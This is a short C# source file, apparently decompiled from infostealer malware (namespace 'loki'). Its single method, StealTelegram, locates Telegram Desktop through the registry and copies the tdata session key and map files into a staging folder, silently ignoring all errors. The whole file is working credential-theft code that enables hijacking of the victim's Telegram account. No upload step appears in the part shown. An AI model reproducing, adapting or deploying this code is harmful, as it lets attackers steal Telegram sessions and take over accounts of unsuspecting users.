using System;
using System.IO;
using System.Linq;
using Microsoft.Win32;

namespace loki.loki.Utilies.App
{
	// Token: 0x0200002F RID: 47
	internal class Telegram
	{
		// Token: 0x0600017B RID: 379 RVA: 0x0000A310 File Offset: 0x00008510
		public static void StealTelegram(string dir)
		{
			try
			{
				using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Classes\\tdesktop.tg\\DefaultIcon"))
				{
					string text = (string)registryKey.GetValue(null);
					string text2 = text.Remove(text.LastIndexOf('\\') + 1).Replace('"', ' ') + "tdata";
					Directory.CreateDirectory(dir + "\\Telegram");
					string text3 = Path.Combine(dir, "Telegram");
					foreach (string text4 in Directory.GetFiles(text2))
					{
						string text5 = text4.Split(new char[]
						{
							'\\'
						}).Last<string>();
						if (text5.Length.Equals(17))
						{
							string path = text5.Substring(0, 16);
							if (Directory.Exists(Path.Combine(text2, path)))
							{
								Directory.CreateDirectory(text3);
								File.Copy(text4, Path.Combine(text3, text5));
								Directory.CreateDirectory(Path.Combine(text3, path));
								foreach (string text6 in Directory.GetFiles(Path.Combine(text2, path)))
								{
									if (text6.Split(new char[]
									{
										'\\'
									}).Last<string>().Contains("map"))
									{
										File.Copy(text6, Path.Combine(text3, path, text6.Split(new char[]
										{
											'\\'
										}).Last<string>()));
									}
								}
							}
						}
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}
}
